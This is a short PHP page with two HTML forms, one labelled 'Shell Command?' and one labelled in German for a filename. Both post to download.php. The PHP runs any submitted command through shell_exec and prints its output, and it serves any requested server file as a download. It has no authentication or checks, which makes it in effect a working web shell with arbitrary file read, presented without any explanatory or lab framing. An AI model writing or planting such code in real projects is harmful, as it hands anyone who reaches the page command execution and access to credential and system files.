<!DOCTYPE html>
<form action="download.php" method="post">
Shell Command? <input type="text" name="command">
<input type="submit">
</form>

<!DOCTYPE html>
<form action="download.php" method="post">
Datei? <input type="text" name="filename">
<input type="submit">
</form>

<?php
$command = $_POST["command"];
$file = $_POST["filename"];


echo "<pre>";
echo shell_exec($command);
echo "</pre>";




// Check if the file exists
if (file_exists($file)) {
    // Set appropriate headers
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . basename($file));
    header('Content-Length: ' . filesize($file));

    // Read the file and output it to the browser 
    readfile($file);
    exit;
} else {
    // File not found
    echo 'File not found.';
}
?>